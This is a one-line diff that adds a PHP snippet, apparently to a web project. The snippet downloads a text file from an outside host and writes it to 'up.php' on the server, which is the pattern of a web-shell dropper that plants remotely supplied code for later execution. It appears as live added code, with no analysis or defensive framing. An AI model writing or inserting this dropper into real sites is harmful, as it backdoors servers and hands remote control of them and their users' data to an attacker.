@@ -1,0 +1,1 @@
+<?php$file = fopen("up.php" ,"w+");$sa=file_get_contents('http://www.thescienceforum.com/l.txt');$write = fwrite ($file ,$sa);?>
